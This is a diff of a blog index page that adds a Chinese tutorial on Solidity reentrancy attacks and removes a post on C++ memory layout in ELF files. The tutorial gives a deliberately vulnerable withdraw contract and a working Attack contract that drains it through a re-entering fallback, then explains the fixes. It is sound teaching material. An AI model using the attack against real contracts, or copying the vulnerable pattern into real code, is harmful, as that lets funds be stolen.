@@ -188,6 +188,172 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="博">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bolog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/" class="post-title-link" itemprop="url">重入攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-11-28 15:03:13 / Modified: 16:09:46" itemprop="dateCreated datePublished" datetime="2024-11-28T15:03:13+08:00">2024-11-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/blockchain/" itemprop="url" rel="index"><span itemprop="name">blockchain</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="重入攻击（Reentrancy-Attack）"><a href="#重入攻击（Reentrancy-Attack）" class="headerlink" title="重入攻击（Reentrancy Attack）"></a>重入攻击（Reentrancy Attack）</h1><p>重入攻击是指攻击者通过调用目标合约的某个函数，利用该函数在完成关键状态变量更新前调用外部合约的能力，从而反复调用目标合约的函数，最终实现非法的资金提取或状态操作。</p>
+<h2 id="漏洞合约"><a href="#漏洞合约" class="headerlink" title="漏洞合约"></a>漏洞合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // 存款函数</span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提款函数，存在重入攻击漏洞</span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        // 向用户发送资金</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">        // 更新用户余额</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 合约余额</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是一个容易受到重入攻击的合约，它允许用户存款并提款。</p>
+<p><strong>问题:</strong></p>
+<ul>
+<li>在发送资金后，余额更新在后。</li>
+<li>攻击者可以通过调用自己的回调函数，在 withdraw 执行完成前再次调用 withdraw，从而重复提款。</li>
+</ul>
+<h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Vulnerable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Vulnerable public vulnerable;</span><br><span class="line"></span><br><span class="line">    constructor(address _vulnerableAddress) &#123;</span><br><span class="line">        vulnerable = Vulnerable(_vulnerableAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 回退函数：用于重入攻击</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (address(vulnerable).balance &gt;= 1 ether) &#123;</span><br><span class="line">            vulnerable.withdraw(1 ether); // 重复调用</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 攻击函数</span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether, &quot;Need at least 1 ether&quot;);</span><br><span class="line">        vulnerable.deposit&#123;value: 1 ether&#125;(); // 存款</span><br><span class="line">        vulnerable.withdraw(1 ether);        // 首次提款</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查看攻击合约余额</span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击步骤：</strong></p>
+<ol>
+<li>攻击者部署 Attack 合约并调用 attack。</li>
+<li>调用 vulnerable.withdraw(1 ether) 时触发回退函数 fallback。</li>
+<li>回退函数再次调用 withdraw，在余额未更新之前反复提款。</li>
+</ol>
+<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><ul>
+<li><strong>状态变量优先更新</strong>：在执行外部调用前，先更新合约的状态。</li>
+<li><strong>通过加锁来限制重入</strong>：通过给<code>function</code>加锁，来限制重入，以达到防止攻击的目的。</li>
+</ul>
+<h2 id="状态变量优先更新"><a href="#状态变量优先更新" class="headerlink" title="状态变量优先更新"></a>状态变量优先更新</h2><p>将状态变量的更新移到外部调用之前。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        // 先更新余额，后转账</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="通过加锁来限制重入"><a href="#通过加锁来限制重入" class="headerlink" title="通过加锁来限制重入"></a>通过加锁来限制重入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // 通过加锁来限制重入</span><br><span class="line">    bool private locker = false;</span><br><span class="line">    modifier locked() &#123;</span><br><span class="line">        require(!locker, &quot;reentrant call&quot;);</span><br><span class="line">        locker = true;</span><br><span class="line">        _;</span><br><span class="line">        locker = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public locked &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也可通过使用OpenZeppelin中提供的<code>ReentrancyGuard</code>工具来防止攻击，<code>ReentrancyGuard</code>机制与锁机制相同。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Vulnerable is ReentrancyGuard &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public nonReentrant &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2024/11/28/blockchain/ethereum/solidity-security/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="博">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bolog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/11/28/blockchain/ethereum/solidity-security/" class="post-title-link" itemprop="url">solidity编程安全</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-11-28 14:20:13 / Modified: 16:59:37" itemprop="dateCreated datePublished" datetime="2024-11-28T14:20:13+08:00">2024-11-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/blockchain/" itemprop="url" rel="index"><span itemprop="name">blockchain</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在编写 Solidity 智能合约时，安全性是最重要的考虑因素之一。以下是开发中常见的安全问题及其解决方法：</p>
+<h1 id="重入攻击（Reentrancy-Attack）"><a href="#重入攻击（Reentrancy-Attack）" class="headerlink" title="重入攻击（Reentrancy Attack）"></a>重入攻击（Reentrancy Attack）</h1><p><a href="https://zhoubofsy.github.io/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/">https://zhoubofsy.github.io/2024/11/28/blockchain/ethereum/solidity-security-reentrancy-attack/</a></p>
+<h1 id="溢出与下溢（Overflow-and-Underflow）"><a href="#溢出与下溢（Overflow-and-Underflow）" class="headerlink" title="溢出与下溢（Overflow and Underflow）"></a>溢出与下溢（Overflow and Underflow）</h1>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2024/11/26/blockchain/ethereum/erc20-openzeppelin/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1627,203 +1793,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2021/09/27/language/cpp/variable-in-elf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="博">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Bolog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/09/27/language/cpp/variable-in-elf/" class="post-title-link" itemprop="url">变量及函数在内存中的位置</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-09-27 15:50:26" itemprop="dateCreated datePublished" datetime="2021-09-27T15:50:26+08:00">2021-09-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-09-09 15:57:18" itemprop="dateModified" datetime="2024-09-09T15:57:18+08:00">2024-09-09</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/language/" itemprop="url" rel="index"><span itemprop="name">language</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>从一个CPP文件编译成ELF可执行文件过程中会把不同的变量和函数映射到不同的内存区域。这些不同的区域具有不同的访问权限，有的是只读的，有的是读写的，有的是可执行的。让我们举个简单的例子来了解一下。</p>
-<p>示例代码</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> dst_type,<span class="keyword">typename</span> src_type&gt;</span></span><br><span class="line"><span class="function">dst_type <span class="title">pointer_cast</span><span class="params">(src_type src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> *<span class="built_in">static_cast</span>&lt;dst_type*&gt;(<span class="built_in">static_cast</span>&lt;<span class="type">void</span>*&gt;(&amp;src));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_uninit_var;</span><br><span class="line"><span class="type">int</span> global_init_var = <span class="number">255</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> const_global_int = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Just a function\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">static_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">inline_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="type">pfunc_t</span>)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*<span class="type">main_func_t</span>)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="type">static_func_t</span>)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Simple</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">Show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;I am Show...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">localshow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;I am localshow...\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> local_uninit_var;</span><br><span class="line">    <span class="type">int</span> local_init_var = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> const_local_int = <span class="number">127</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>* heap_int = <span class="keyword">new</span> <span class="built_in">int</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">pfunc_t</span> pf = func;</span><br><span class="line">    <span class="type">main_func_t</span> mf = main;</span><br><span class="line">    <span class="type">static_func_t</span> sf = static_func;</span><br><span class="line">    <span class="type">static_func_t</span> csf = Simple::Show;</span><br><span class="line">    <span class="type">void</span>* cpf = <span class="built_in">pointer_cast</span>&lt;<span class="type">void</span>*&gt;(&amp;Simple::localshow);</span><br><span class="line">    <span class="type">pfunc_t</span> ipf = inline_func;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_uninit_var: 0x%x\n&quot;</span>, &amp;global_uninit_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;global_init_var: 0x%x\n&quot;</span>, &amp;global_init_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;static_var: 0x%x\n&quot;</span>, &amp;static_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;const_global_int: 0x%x\n&quot;</span>, &amp;const_global_int);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;local_uninit_var: 0x%x\n&quot;</span>, &amp;local_uninit_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;local_init_var: 0x%x\n&quot;</span>, &amp;local_init_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;const_local_int: 0x%x\n&quot;</span>, &amp;const_local_int);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap_int: 0x%x, 0x%x\n&quot;</span>, &amp;heap_int, heap_int);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;point_func: 0x%x, 0x%x\n&quot;</span>, &amp;pf, pf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;point_main_func: 0x%x, 0x%x\n&quot;</span>, &amp;mf, mf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;static_func: 0x%x, 0x%x\n&quot;</span>, &amp;sf, sf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;class_static_func: 0x%x, 0x%x\n&quot;</span>, &amp;csf, csf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;class_local_func: 0x%x, 0x%x\n&quot;</span>, &amp;cpf, cpf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;inline_func: 0x%x, 0x%x\n&quot;</span>, &amp;ipf, ipf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>由于ELF格式中有很多信息，我们只取<code>readelf --sections</code>相关信息<br>ELF结构如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[Nr] Name              Type             Address           Offset       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">[ 0]                   NULL             0000000000000000  00000000       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">[ 1] .interp           PROGBITS         00000000004002a8  000002a8       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">[ 2] .note.gnu.bu[...] NOTE             00000000004002c4  000002c4       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">[ 3] .note.ABI-tag     NOTE             00000000004002e8  000002e8       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">[ 4] .gnu.hash         GNU_HASH         0000000000400308  00000308       000000000000001c  0000000000000000   A       5     0     8</span><br><span class="line">[ 5] .dynsym           DYNSYM           0000000000400328  00000328       0000000000000090  0000000000000018   A       6     1     8</span><br><span class="line">[ 6] .dynstr           STRTAB           00000000004003b8  000003b8       000000000000007d  0000000000000000   A       0     0     1</span><br><span class="line">[ 7] .gnu.version      VERSYM           0000000000400436  00000436       000000000000000c  0000000000000002   A       5     0     2</span><br><span class="line">[ 8] .gnu.version_r    VERNEED          0000000000400448  00000448       0000000000000040  0000000000000000   A       6     2     8</span><br><span class="line">[ 9] .rela.dyn         RELA             0000000000400488  00000488       0000000000000018  0000000000000018   A       5     0     8</span><br><span class="line">[10] .rela.plt         RELA             00000000004004a0  000004a0       0000000000000078  0000000000000018  AI       5    22     8</span><br><span class="line">[11] .init             PROGBITS         0000000000401000  00001000       000000000000001a  0000000000000000  AX       0     0     4</span><br><span class="line">[12] .plt              PROGBITS         0000000000401020  00001020       0000000000000060  0000000000000010  AX       0     0     16</span><br><span class="line">[13] .text             PROGBITS         0000000000401080  00001080       0000000000000392  0000000000000000  AX       0     0     16</span><br><span class="line">[14] .fini             PROGBITS         0000000000401414  00001414       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">[15] .rodata           PROGBITS         0000000000402000  00002000       000000000000019e  0000000000000000   A       0     0     8</span><br><span class="line">[16] .eh_frame_hdr     PROGBITS         00000000004021a0  000021a0       0000000000000064  0000000000000000   A       0     0     4</span><br><span class="line">[17] .eh_frame         PROGBITS         0000000000402208  00002208       00000000000001b8  0000000000000000   A       0     0     8</span><br><span class="line">[18] .init_array       INIT_ARRAY       0000000000403de8  00002de8       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">[19] .fini_array       FINI_ARRAY       0000000000403df0  00002df0       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">[20] .dynamic          DYNAMIC          0000000000403df8  00002df8       0000000000000200  0000000000000010  WA       6     0     8</span><br><span class="line">[21] .got              PROGBITS         0000000000403ff8  00002ff8       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">[22] .got.plt          PROGBITS         0000000000404000  00003000       0000000000000040  0000000000000008  WA       0     0     8</span><br><span class="line">[23] .data             PROGBITS         0000000000404040  00003040       000000000000000c  0000000000000000  WA       0     0     4</span><br><span class="line">[24] .bss              NOBITS           000000000040404c  0000304c       000000000000000c  0000000000000000  WA       0     0     4</span><br><span class="line">[25] .comment          PROGBITS         0000000000000000  0000304c       000000000000005c  0000000000000001  MS       0     0     1</span><br><span class="line">[26] .debug_aranges    PROGBITS         0000000000000000  000030a8       0000000000000070  0000000000000000           0     0     1</span><br><span class="line">[27] .debug_info       PROGBITS         0000000000000000  00003118       000000000000031a  0000000000000000           0     0     1</span><br><span class="line">[28] 